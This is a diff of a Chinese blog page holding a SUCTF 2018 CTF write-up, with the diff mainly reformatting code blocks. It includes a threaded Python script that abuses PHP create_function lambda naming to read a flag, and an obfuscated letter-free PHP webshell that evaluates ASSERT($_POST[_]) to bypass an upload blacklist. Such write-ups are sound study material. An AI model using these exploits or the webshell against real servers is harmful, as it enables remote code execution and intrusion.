@@ -71,19 +71,19 @@
 
 
 
-<meta name="description" content="WEBAnonymous123456789101112&amp;lt;?php$MY = create_function(&amp;quot;&amp;quot;,&amp;quot;die(`cat flag.php`);&amp;quot;);$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(&amp;quot;function SUCTF_$hash()&amp;#123;&amp;quot;">
+<meta name="description" content="WEBAnonymous&amp;lt;?php $MY = create_function(&amp;quot;&amp;quot;,&amp;quot;die(`cat flag.php`);&amp;quot;); $hash = bin2hex(openssl_random_pseudo_bytes(32)); eval(&amp;quot;function SUCTF_$hash(){&amp;quot;     .&amp;quot;global">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SUCTF 2018 writeup">
-<meta property="og:url" content="http://www.cuittk.cn/2018/11/10/SUCTF 2018 writeup/index.html">
+<meta property="og:url" content="https://blog.cuittk.cn/2018/11/10/SUCTF 2018 writeup/index.html">
 <meta property="og:site_name" content="h1tler&#39;s blog">
-<meta property="og:description" content="WEBAnonymous123456789101112&amp;lt;?php$MY = create_function(&amp;quot;&amp;quot;,&amp;quot;die(`cat flag.php`);&amp;quot;);$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(&amp;quot;function SUCTF_$hash()&amp;#123;&amp;quot;">
+<meta property="og:description" content="WEBAnonymous&amp;lt;?php $MY = create_function(&amp;quot;&amp;quot;,&amp;quot;die(`cat flag.php`);&amp;quot;); $hash = bin2hex(openssl_random_pseudo_bytes(32)); eval(&amp;quot;function SUCTF_$hash(){&amp;quot;     .&amp;quot;global">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/bz2ipyu22owdn1mgwsiadr6bt9.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/c19y2cbh91nstj0g883h7ntrzf.png">
-<meta property="og:updated_time" content="2019-11-11T17:11:48.992Z">
+<meta property="og:updated_time" content="2020-02-26T09:14:42.647Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SUCTF 2018 writeup">
-<meta name="twitter:description" content="WEBAnonymous123456789101112&amp;lt;?php$MY = create_function(&amp;quot;&amp;quot;,&amp;quot;die(`cat flag.php`);&amp;quot;);$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(&amp;quot;function SUCTF_$hash()&amp;#123;&amp;quot;">
+<meta name="twitter:description" content="WEBAnonymous&amp;lt;?php $MY = create_function(&amp;quot;&amp;quot;,&amp;quot;die(`cat flag.php`);&amp;quot;); $hash = bin2hex(openssl_random_pseudo_bytes(32)); eval(&amp;quot;function SUCTF_$hash(){&amp;quot;     .&amp;quot;global">
 <meta name="twitter:image" content="http://img.cdn.cuittk.cn/bz2ipyu22owdn1mgwsiadr6bt9.png">
 
 
@@ -114,12 +114,12 @@
 
 
 
-  <link rel="canonical" href="http://www.cuittk.cn/2018/11/10/SUCTF 2018 writeup/"/>
+  <link rel="canonical" href="https://blog.cuittk.cn/2018/11/10/SUCTF 2018 writeup/"/>
 
 
 
 
-
+<link rel="stylesheet" href="/js/prism/prism.css">
   <title>SUCTF 2018 writeup | h1tler's blog</title>
   
 
@@ -257,7 +257,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2018/11/10/SUCTF 2018 writeup/">
+    <link itemprop="mainEntityOfPage" href="https://blog.cuittk.cn/2018/11/10/SUCTF 2018 writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="h1tler">
@@ -351,16 +351,101 @@
       
 
       
-        <h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);</div><div class="line">$hash = bin2hex(openssl_random_pseudo_bytes(32));</div><div class="line">eval(&quot;function SUCTF_$hash()&#123;&quot;</div><div class="line">    .&quot;global \$MY;&quot;</div><div class="line">    .&quot;\$MY();&quot;</div><div class="line">    .&quot;&#125;&quot;);</div><div class="line">if(isset($_GET[&apos;func_name&apos;]))&#123;</div><div class="line">    $_GET[&quot;func_name&quot;]();</div><div class="line">    die();</div><div class="line">&#125;</div><div class="line">show_source(__FILE__);</div></pre></td></tr></table></figure>
-<p>参考：<a href="https://www.jianshu.com/p/19e3ee990cb7" target="_blank" rel="external">https://www.jianshu.com/p/19e3ee990cb7</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">import socket</div><div class="line">import time</div><div class="line">from multiprocessing.dummy import Pool as ThreadPool</div><div class="line">try:</div><div class="line">    requests.packages.urllib3.disable_warnings()</div><div class="line">except:</div><div class="line">    pass</div><div class="line"></div><div class="line">def run(i):</div><div class="line">    while 1:</div><div class="line">        HOST = &apos;web.suctf.asuri.org&apos;</div><div class="line">        PORT = 81</div><div class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">        s.connect((HOST, PORT))</div><div class="line">        s.sendall(&apos;GET /index.php HTTP/1.1\nHost: web.suctf.asuri.org\nConnection: Keep-Alive\n\n&apos;)</div><div class="line">        # s.close()</div><div class="line">        print &apos;ok&apos;</div><div class="line">        time.sleep(0.5)</div><div class="line">        print requests.get(&apos;http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1&apos;).content</div><div class="line"></div><div class="line">i = 8</div><div class="line">pool = ThreadPool( i )</div><div class="line">result = pool.map_async( run, range(i) ).get(0xffff)</div></pre></td></tr></table></figure></p>
+        <h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h4><pre><code class="language-php">&lt;?php
+$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);
+$hash = bin2hex(openssl_random_pseudo_bytes(32));
+eval(&quot;function SUCTF_$hash(){&quot;
+    .&quot;global \$MY;&quot;
+    .&quot;\$MY();&quot;
+    .&quot;}&quot;);
+if(isset($_GET[&#39;func_name&#39;])){
+    $_GET[&quot;func_name&quot;]();
+    die();
+}
+show_source(__FILE__);
+</code></pre>
+<p>参考：<a href="https://www.jianshu.com/p/19e3ee990cb7" target="_blank" rel="external">https://www.jianshu.com/p/19e3ee990cb7</a></p>
+<pre><code class="language-python">import requests
+import socket
+import time
+from multiprocessing.dummy import Pool as ThreadPool
+try:
+    requests.packages.urllib3.disable_warnings()
+except:
+    pass
+
+def run(i):
+    while 1:
+        HOST = &#39;web.suctf.asuri.org&#39;
+        PORT = 81
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((HOST, PORT))
+        s.sendall(&#39;GET /index.php HTTP/1.1\nHost: web.suctf.asuri.org\nConnection: Keep-Alive\n\n&#39;)
+        # s.close()
+        print &#39;ok&#39;
+        time.sleep(0.5)
+        print requests.get(&#39;http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1&#39;).content
+
+i = 8
+pool = ThreadPool( i )
+result = pool.map_async( run, range(i) ).get(0xffff)
+</code></pre>
 <p><img src="http://img.cdn.cuittk.cn/bz2ipyu22owdn1mgwsiadr6bt9.png" alt=""></p>
-<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>要求上传的webshell文件从第6个字符开始都不能在黑名单内。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">if($contents=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]))&#123;</div><div class="line">    $data=substr($contents,5);</div><div class="line">    foreach ($black_char as $b) &#123;</div><div class="line">        if (stripos($data, $b) !== false)&#123;</div><div class="line">            die(&quot;illegal char&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;     </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>要求上传的webshell文件从第6个字符开始都不能在黑名单内。</p>
+<pre><code class="language-php">if($contents=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;])){
+    $data=substr($contents,5);
+    foreach ($black_char as $b) {
+        if (stripos($data, $b) !== false){
+            die(&quot;illegal char&quot;);
+        }
+    }     
+}
+</code></pre>
 <p>用burp intruder跑一遍，发现不在黑名单里的可打印字符有 $()[]_~=;. 共10个。</p>
 <p>跑的时候需注意Intruder=&gt;payloads=&gt;payload encoding 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。</p>
 <p>跑的时候可以在Intruder=&gt;options=&gt;Grep-Match 中选择 flag illegal ，这样就可以快速看到那些字符是合法的了。</p>
-<p>接下来就是构造一个由 $()[]_~=;. 组成的webshell了，主要思路来自 一些不包含数字和字母的webshell 。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_=_==_;//1 _==_ 它两相等为True 那么$_就被赋值为1了</div></pre></td></tr></table></figure></p>
-<p>“~” 求反运算<br><img src="http://img.cdn.cuittk.cn/c19y2cbh91nstj0g883h7ntrzf.png" alt=""><br>所以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;?= </div><div class="line">$_=_==_;//1 _==_ 相等为True 那么$_就被赋值为1了</div><div class="line">$__=~一[$_];//G</div><div class="line">$___=~二[$_];//E</div><div class="line">$____=~端[$_];//T</div><div class="line">$_____=~得[$_];//A</div><div class="line">$______=~第[$_];//S</div><div class="line">$_______=~学[$_];//R</div><div class="line">$_=_.$__.$___.$____;//_GET</div><div class="line">$_=$$_;//$_GET</div><div class="line">$__=$_____.$______.$______.$___.$_______.$____;//ASSERT</div><div class="line">$__($_[_]);//ASSERT($_GET[_]);</div><div class="line"></div><div class="line">echo ~对[$_];//P</div><div class="line">echo ~就[$_];//O</div><div class="line">echo ~第[$_];//S</div><div class="line">echo ~端[$_];//T</div><div class="line">------------------------------------------------------</div><div class="line">http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php</div><div class="line">?_=phpinfo();</div></pre></td></tr></table></figure></p>
-<p>构造出的最终结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?= $_=_==_;</div><div class="line">$__=~对[$_];</div><div class="line">$___=~就[$_];</div><div class="line">$____=~第[$_];</div><div class="line">$_____=~端[$_];</div><div class="line">$______=~得[$_];</div><div class="line">$_______=~二[$_];</div><div class="line">$________=~学[$_];</div><div class="line">$_=_.$__.$___.$____.$_____;</div><div class="line">$_=$$_;</div><div class="line">$__=$______.$____.$____.$_______.$________.$_____;</div><div class="line">$__($_[_]);</div><div class="line"></div><div class="line"></div><div class="line">//ASSERT($_POST[_]);可用菜刀连接</div></pre></td></tr></table></figure></p>
+<p>接下来就是构造一个由 $()[]_~=;. 组成的webshell了，主要思路来自 一些不包含数字和字母的webshell 。</p>
+<pre><code class="language-html">$_=_==_;//1 _==_ 它两相等为True 那么$_就被赋值为1了
+</code></pre>
+<p>“~” 求反运算<br><img src="http://img.cdn.cuittk.cn/c19y2cbh91nstj0g883h7ntrzf.png" alt=""><br>所以</p>
+<pre><code class="language-php">&lt;?= 
+$_=_==_;//1 _==_ 相等为True 那么$_就被赋值为1了
+$__=~一[$_];//G
+$___=~二[$_];//E
+$____=~端[$_];//T
+$_____=~得[$_];//A
+$______=~第[$_];//S
+$_______=~学[$_];//R
+$_=_.$__.$___.$____;//_GET
+$_=$$_;//$_GET
+$__=$_____.$______.$______.$___.$_______.$____;//ASSERT
+$__($_[_]);//ASSERT($_GET[_]);
+
+echo ~对[$_];//P
+echo ~就[$_];//O
+echo ~第[$_];//S
+echo ~端[$_];//T
+------------------------------------------------------
+http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php
+?_=phpinfo();
+</code></pre>
+<p>构造出的最终结果如下：</p>
+<pre><code class="language-php">&lt;?= $_=_==_;
+$__=~对[$_];
+$___=~就[$_];
+$____=~第[$_];
+$_____=~端[$_];
+$______=~得[$_];
+$_______=~二[$_];
+$________=~学[$_];
+$_=_.$__.$___.$____.$_____;
+$_=$$_;
+$__=$______.$____.$____.$_______.$________.$_____;
+$__($_[_]);
+
+
+//ASSERT($_POST[_]);可用菜刀连接
+</code></pre>
 
       
     </div>
@@ -479,7 +564,7 @@
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -607,7 +692,7 @@
 
 
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
+<script src="/js/prism/prism.js" async></script>
         
 <div class="busuanzi-count">
   <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
